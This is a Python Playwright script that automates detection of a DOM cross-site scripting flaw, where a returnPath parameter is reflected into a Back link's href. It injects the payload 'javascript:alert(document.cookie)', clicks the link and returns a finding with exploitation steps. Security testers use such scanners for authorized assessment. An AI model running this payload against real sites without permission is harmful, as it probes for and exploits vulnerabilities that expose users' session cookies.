#!/usr/bin/env python3
import random
import re
import string
import urllib.parse
from typing import Dict, Optional

from playwright.sync_api import TimeoutError as PlaywrightTimeoutError
from playwright.sync_api import sync_playwright


def _random_token(length: int) -> str:
    alphabet = string.ascii_letters + string.digits
    return "".join(random.choice(alphabet) for _ in range(length))


def _build_url(base_url: str, feedback_path: str, return_path: str) -> str:
    base = base_url.rstrip("/") + "/"
    feedback_url = urllib.parse.urljoin(base, feedback_path.lstrip("/"))
    parsed = urllib.parse.urlparse(feedback_url)
    query = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    query["returnPath"] = [return_path]
    new_query = urllib.parse.urlencode(query, doseq=True)
    return parsed._replace(query=new_query).geturl()


def _discover_feedback_path(page, base_url: str, timeout_s: int) -> str:
    try:
        page.goto(base_url, wait_until="domcontentloaded", timeout=timeout_s * 1000)
    except PlaywrightTimeoutError:
        return "/feedback"
    page.wait_for_timeout(500)
    link = page.get_by_role("link", name=re.compile(r"submit\s+feedback", re.I))
    if link.count() > 0:
        href = link.first.get_attribute("href")
        if href:
            return href
    return "/feedback"


def _find_back_link(page, expected_fragment: Optional[str], timeout_s: int):
    try:
        page.wait_for_selector("a", timeout=timeout_s * 1000)
    except PlaywrightTimeoutError:
        return None

    if expected_fragment:
        try:
            locator = page.locator(f"a[href*='{expected_fragment}']")
            if locator.count() > 0:
                return locator.first
        except Exception:
            pass

    try:
        locator = page.get_by_role("link", name=re.compile(r"^back$", re.I))
        if locator.count() > 0:
            return locator.first
    except Exception:
        pass

    locator = page.locator("a")
    if locator.count() > 0:
        return locator.first
    return None


def check_returnpath_dom_xss(
    base_url: str,
    feedback_path: Optional[str] = None,
    timeout_s: int = 12,
    headed: bool = False,
    slow_mo_ms: int = 0,
) -> Optional[Dict]:
    """
    Automate a DOM XSS workflow where returnPath is reflected into an <a href>,
    then set to javascript:alert(document.cookie) and click "Back".
    Returns a vulnerability dict if an alert dialog is observed.
    """
    token = _random_token(10)
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=not headed, slow_mo=slow_mo_ms)
        page = browser.new_page()

        if not feedback_path:
            feedback_path = _discover_feedback_path(page, base_url, timeout_s)

        url_check = _build_url(base_url, feedback_path, f"/{token}")
        page.goto(url_check, wait_until="domcontentloaded", timeout=timeout_s * 1000)
        page.wait_for_timeout(500)

        back_link = _find_back_link(page, token, timeout_s)
        if back_link is None:
            browser.close()
            return None

        href = back_link.get_attribute("href") or ""
        if token not in href:
            browser.close()
            return None

        url_xss = _build_url(base_url, feedback_path, "javascript:alert(document.cookie)")
        page.goto(url_xss, wait_until="domcontentloaded", timeout=timeout_s * 1000)
        page.wait_for_timeout(500)

        back_link = _find_back_link(page, "javascript:", timeout_s)
        if back_link is None:
            browser.close()
            return None

        triggered = {"dialog": False}

        def on_dialog(dialog):
            triggered["dialog"] = True
            try:
                dialog.dismiss()
            except Exception:
                pass

        page.on("dialog", on_dialog)
        back_link.click(timeout=timeout_s * 1000)
        page.wait_for_timeout(1000)
        browser.close()

        if not triggered["dialog"]:
            return None

        return {
            "type": "dom_xss",
            "method": "GET",
            "parameter": "returnPath",
            "payload": "javascript:alert(document.cookie)",
            "url": url_xss,
            "severity": "high",
            "description": "DOM XSS via returnPath reflected into href and executed on Back click (browser verified)",
            "context": "href javascript: URL",
            "verified": True,
            "exploitation": {
                "browser_steps": [
                    f"Open: {url_check}",
                    "Verify the returnPath token is reflected inside the Back link href",
                    f"Open: {url_xss}",
                    "Click the Back link",
                    "Observe an alert dialog (document.cookie)",
                ]
            },
        }

